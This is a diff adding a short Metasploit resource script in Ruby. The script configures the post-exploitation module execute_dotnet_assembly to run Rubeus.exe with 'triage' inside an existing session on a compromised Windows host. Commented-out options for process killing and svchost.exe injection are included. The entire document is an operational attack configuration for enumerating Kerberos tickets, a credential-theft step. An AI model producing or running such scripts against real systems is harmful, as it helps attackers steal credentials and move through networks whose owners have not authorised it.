@@ -1,0 +1,21 @@
+<ruby>
+CWD = Dir.pwd
+DOTNET_EXE = File.expand_path("exe/Rubeus.exe", CWD)
+
+puts DOTNET_EXE
+ARGUMENTS = 'triage'
+TECHNIQUE = 'SELF'
+# KILL = 'true'
+# PROCESS = 'svchost.exe'
+run_single('use post/windows/manage/execute_dotnet_assembly')
+run_single("set ARGUMENTS #{ARGUMENTS}")
+run_single("set DOTNET_EXE #{DOTNET_EXE}")
+run_single("set TECHNIQUE #{TECHNIQUE}")
+# run_single("set KILL #{KILL}")
+run_single("show options missing")
+
+unless defined?(SESSION)
+  puts "> Set your SESSION"
+end
+sleep(1)
+</ruby>
